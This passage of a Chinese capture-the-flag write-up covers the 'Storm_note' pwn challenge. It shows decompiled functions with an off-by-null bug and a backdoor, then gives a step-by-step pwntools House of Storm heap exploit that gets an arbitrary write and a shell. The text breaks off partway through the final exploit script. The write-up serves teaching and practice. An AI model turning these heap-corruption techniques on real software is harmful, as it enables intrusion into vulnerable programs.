[rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Index ?"</span>);<br>  _isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;size);<br>  <span class="hljs-keyword">if</span> ( size &lt;= <span class="hljs-number">0xF</span> &amp;&amp; note[size] )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Content: "</span>);<br>    v2 = <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, note[size], note_size[size]);<br>    *(note[size] + v2) = <span class="hljs-number">0</span>;                     <span class="hljs-comment">// off-by-null</span><br>                                                <span class="hljs-comment">// </span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid index"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h4><p>无uaf</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">delete_note</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Index ?"</span>);<br>  _isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; note[v1] )<br>  {<br>    <span class="hljs-built_in">free</span>(note[v1]);<br>    note[v1] = <span class="hljs-number">0LL</span>;<br>    note_size[v1] = <span class="hljs-number">0</span>;<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid index"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="一个后门函数"><a href="#一个后门函数" class="headerlink" title="一个后门函数"></a>一个后门函数</h4><p>要想执行system(“/bin/sh”);，需要输入与程序一开始分配的随机数相同的数</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">void __noreturn backdoor()<br>{<br>  char buf[<span class="hljs-number">56</span>]; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">0</span>h] [rbp-<span class="hljs-number">40</span>h] BYREF<br>  unsigned __int64 v1; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">38</span>h] [rbp-<span class="hljs-number">8</span>h]<br><br>  v1 = __readfsqword(<span class="hljs-number">0</span>x28u);<br>  puts(<span class="hljs-string">"If you can open the lock, I will let you in"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0</span>x30uLL);<br>  <span class="hljs-keyword">if</span> ( !memcmp(buf, <span class="hljs-number">0</span>xABCD0100LL, <span class="hljs-number">0</span>x30uLL) )<br>    system(<span class="hljs-string">"/bin/sh"</span>);<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>1、利用off-by-null 漏洞构造堆风水，实现堆块重叠，从而控制堆块内容。<br>2、House of storm，将处于unsortedbin的可控制的chunk放入largebin中，以便触发largebin attack<br>3、控制largebin的bk和bk_nextsize指针，通过malloc触发漏洞，分配到目标地址，实现任意地址写，将0xABCD0100处的0x30字节改为已知值，获得shell</p><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>先把前面的东西写好</p><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs vim"># coding=utf-<span class="hljs-number">8</span><br>from pwn import *<br>#context(endian=<span class="hljs-string">'little'</span>,os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>)<br><span class="hljs-keyword">sh</span> = process(<span class="hljs-string">'./Storm_note'</span>)<br><br>s       = lambda data               :<span class="hljs-keyword">sh</span>.send(data)<br><span class="hljs-keyword">sa</span>      = lambda delim,data         :<span class="hljs-keyword">sh</span>.sendafter(delim, data)<br><span class="hljs-keyword">sl</span>      = lambda data               :<span class="hljs-keyword">sh</span>.sendline(data)<br><span class="hljs-keyword">sla</span>     = lambda delim,data         :<span class="hljs-keyword">sh</span>.sendlineafter(delim, data)<br>r       = lambda num=<span class="hljs-number">4096</span>           :<span class="hljs-keyword">sh</span>.recv(num)<br><span class="hljs-keyword">ru</span>      = lambda delims    :<span class="hljs-keyword">sh</span>.recvuntil(delims)<br>itr     = lambda                    :<span class="hljs-keyword">sh</span>.interactive()<br>uu32    = lambda data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          :<span class="hljs-built_in">log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br><span class="hljs-keyword">lg</span>      = lambda address,data       :<span class="hljs-built_in">log</span>.success(<span class="hljs-string">'%s: '</span>%(address)+hex(data))<br>def dbg():<br>        gdb.attach(<span class="hljs-keyword">sh</span>)<br>        pause()<br><br><br>def <span class="hljs-built_in">add</span>(size):<br>  <span class="hljs-keyword">sla</span>(<span class="hljs-string">'Choice'</span>,<span class="hljs-string">'1'</span>)<br>  <span class="hljs-keyword">sla</span>(<span class="hljs-string">'?'</span>,str(size))<br><br>def <span class="hljs-keyword">edit</span>(<span class="hljs-built_in">index</span>,text):<br>  <span class="hljs-keyword">sla</span>(<span class="hljs-string">'Choice'</span>,<span class="hljs-string">'2'</span>)<br>  <span class="hljs-keyword">sla</span>(<span class="hljs-string">'?'</span>,str(<span class="hljs-built_in">index</span>))<br>  <span class="hljs-keyword">sa</span>(<span class="hljs-string">'Content'</span>,text)<br><br>def free(<span class="hljs-built_in">index</span>):<br>  <span class="hljs-keyword">sla</span>(<span class="hljs-string">'Choice'</span>,<span class="hljs-string">'3'</span>)<br>  <span class="hljs-keyword">sla</span>(<span class="hljs-string">'?'</span>,str(<span class="hljs-built_in">index</span>))<br></code></pre></td></tr></tbody></table></figure><p>首先申请两组chunk，用来构造堆块重叠，并进入unsortedbin和largebin</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>#<span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x508)</span></span>#<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>#<span class="hljs-number">2</span><br><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>#<span class="hljs-number">3</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x508)</span></span>#<span class="hljs-number">4</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>#<span class="hljs-number">5</span><br><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>#<span class="hljs-number">6</span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/321b4d41c3014c2b879d9f599177de23.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/321b4d41c3014c2b879d9f599177de23.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p><p>然后构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">1</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x4f0+p64(<span class="hljs-number">0</span>x500)</span></span>) <br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">4</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x4f0+p64(<span class="hljs-number">0</span>x500)</span></span>) <br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/e61a65c715fa4284ac55a3b9905d09f6.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/e61a65c715fa4284ac55a3b9905d09f6.png?ynotemdtimestamp=1663776442613" alt="img"><br>然后再free(1)，利用off-by-null编辑chunk_0，将chunk_1的size从0x510改为0x500，由于刚才构造的两个fake chunk，此时堆块已合并</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">0</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x18)</span></span>#off-by-null改写chunk1的size为<span class="hljs-number">0</span>x500<br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/9ec5985989204608aa56aafec155f7b5.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/9ec5985989204608aa56aafec155f7b5.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>再申请两个chunk，使之恢复正常，之后free掉chunk_1和chunk_2，使之合并</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>#<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x4d8)</span></span>#<span class="hljs-number">7</span>  <br><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span>    <br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/4e4ed9a1288a49189cef06355829b08d.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/4e4ed9a1288a49189cef06355829b08d.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>再次申请两个特定大小的chunk即可实现chunk7可以控制原unsortedbin chunk 0x4f1的bk指针，即我们可以用chunk_7来控制chunk_2(unsortedbin chunk),为便于理解我们可查看一下note这个存放全局chunk mem指针的数组</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x30)</span></span>#<span class="hljs-number">1</span> 此时chunk1可以控制原unsortedbin chunk  <span class="hljs-number">0</span><span class="hljs-built_in">x4f1</span>(chunk_2)的bk指针<br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x4e0)</span></span>#<span class="hljs-number">2</span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/36e2df6f2de145d9927fe1d89316d64e.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/36e2df6f2de145d9927fe1d89316d64e.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>下面同理获得chunk8可以控制原 （largebin chunk 0x4e1 ）的bk指针和bk_nextsize指针</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">4</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">3</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x18)</span></span><span class="hljs-selector-id">#off</span> by null<br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>#<span class="hljs-number">4</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x4d8)</span></span>#<span class="hljs-number">8</span> <span class="hljs-number">0</span>x5a0<br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">4</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x40)</span></span>#<span class="hljs-number">4</span> <span class="hljs-number">0</span>x580<br></code></pre></td></tr></tbody></table></figure><p>之后free(2)，放入unsortedbin</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span>    <br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/77c5a9870baa4026bff5f9628c03ba04.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/77c5a9870baa4026bff5f9628c03ba04.png?ynotemdtimestamp=1663776442613" alt="img"><br>再申请回来0x4e8（0x4f0）大小的chunk，使0x4e0大小的chunk进入largebin</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x4e8)      # put <span class="hljs-built_in">chunk8</span>(<span class="hljs-number">0</span>x5c0) to largebin<br><br><span class="hljs-built_in">dbg</span>()<br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/a37cfa88b26d4999b0b0317fc9d111fa.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/a37cfa88b26d4999b0b0317fc9d111fa.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>再次free(2)，构造一个unsortedbin chunk和一个largebin chunk</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span> <span class="hljs-selector-id">#put</span> chunk2 to unsortedbin<br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/c0e50b9fc3c149718a85e6b75b358153.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/c0e50b9fc3c149718a85e6b75b358153.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>之后利用刚才构造的堆块重叠，修改unsortedbin chunk的bk指针为目标地址（target-0x20）</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">target</span> = <span class="hljs-number">0</span>xabcd0100<br><span class="hljs-attribute">fake_chunk</span> = target - <span class="hljs-number">0</span>x20<br><br><span class="hljs-attribute">payload</span> = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>x4f1) # size<br><span class="hljs-attribute">payload</span> += p64(<span class="hljs-number">0</span>) + p64(fake_chunk)      # bk<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">7</span>,payload)<br><br><span class="hljs-attribute">dbg</span>()<br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/7bbc8214b1b0476398f502ea56f09b2c.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/7bbc8214b1b0476398f502ea56f09b2c.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/04851cb22b004a94ba30521980d47ec0.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/04851cb22b004a94ba30521980d47ec0.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>之后利用刚才构造的堆块重叠，修改largebin chunk的bk指针和bk_nextsize指针分别为fake_chunk+8，和fake_chunk-0x18-5</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload2 = <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x4e1) <span class="hljs-selector-id">#size</span><br>payload2 += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-built_in">p64</span>(fake_chunk+<span class="hljs-number">8</span>)   <br>payload2 += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-built_in">p64</span>(fake_chunk-<span class="hljs-number">0</span>x18-<span class="hljs-number">5</span>)<span class="hljs-selector-id">#mmap</span><br><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">8</span>,payload2)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/069a9ee48f35474e9a26769b36036e38.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/069a9ee48f35474e9a26769b36036e38.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/f419df60e7804ce282eda0636ae98979.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/f419df60e7804ce282eda0636ae98979.png?ynotemdtimestamp=1663776442613" alt="img"><br>然后申请0x40（0x50）大小的chunk，可以看到在目标地址处0xabcd00e0成功伪造fake chunk，size为0x56，巧妙的实现victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x40)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/950899dc8f374c7387c8f6923d8d813d.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/950899dc8f374c7387c8f6923d8d813d.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>之后就是把0xABCD0100处的0x30个字节改为已知数，然后获得shell</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload = <span class="hljs-string">'\x00'</span>*(<span class="hljs-number">0</span>x10+<span class="hljs-number">0</span>x30)<br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">2</span>,payload)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/65914edb5d2a4b28818664c8e045bbb9.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/65914edb5d2a4b28818664c8e045bbb9.png?ynotemdtimestamp=1663776442613" alt="img"></p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">sla</span><span class="hljs-params">(<span class="hljs-string">'Choice: '</span>,<span class="hljs-string">'666'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">s</span><span class="hljs-params">(p64(<span class="hljs-number">0</span>)</span></span>*<span class="hljs-number">6</span>)<br><span class="hljs-function"><span class="hljs-title">itr</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/c88e75a6f70c4602a715c19022ed53fd.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/c88e75a6f70c4602a715c19022ed53fd.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-comment">#context(endian='little',os='linux',arch='amd64',log_level='debug')</span><br><span class="hljs-attribute">sh</span> = process('./Storm_note')<br><br><span class="hljs-attribute">s</span>       = lambda data               :sh.send(data)<br><span class="hljs-attribute">sa</span>      = lambda delim,data         :sh.sendafter(delim, data)<br><span class="hljs-attribute">sl</span>      = lambda data               :sh.sendline(data)<br><span class="hljs-attribute">sla</span>     = lambda delim,data         :sh.sendlineafter(delim, data)<br><span class="hljs-attribute">r</span>       = lambda num=<span class="hljs-number">4096</span>           :sh.recv(num)<br><span class="hljs-attribute">ru</span>      = lambda delims    :sh.recvuntil(delims)<br><span class="hljs-attribute">itr</span>     = lambda                    :sh.interactive()<br><span class="hljs-attribute">uu32</span>    = lambda data               :u32(data.ljust(<span class="hljs-number">4</span>,'\<span class="hljs-number">0</span>'))<br><span class="hljs-attribute">uu64</span>    = lambda data               :u64(data.ljust(<span class="hljs-number">8</span>,'\<span class="hljs-number">0</span>'))<br><span class="hljs-attribute">leak</span>    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))<br><span class="hljs-attribute">lg</span>      = lambda address,data       :log.success('%s: '%(address)+hex(data))<br><span class="hljs-attribute">def</span> dbg():<br>        <span class="hljs-attribute">gdb</span>.attach(sh)<br>        <span class="hljs-attribute">pause</span>()<br><br><br><span class="hljs-attribute">def</span> add(size):<br>  <span class="hljs-attribute">sla</span>('Choice','<span class="hljs-number">1</span>')<br>  <span class="hljs-attribute">sla</span>('?',str(size))<br><br><span class="hljs-attribute">def</span> edit(index,text):<br>  <span class="hljs-attribute">sla</span>('Choice','<span class="hljs-number">2</span>')<br>  <span class="hljs-attribute">sla</span>('?',str(index))<br>  <span class="hljs-attribute">sa</span>('Content',text)<br><br><span class="hljs-attribute">def</span> free(index):<br>  <span class="hljs-attribute">sla</span>('Choice','<span class="hljs-number">3</span>')<br>  <span 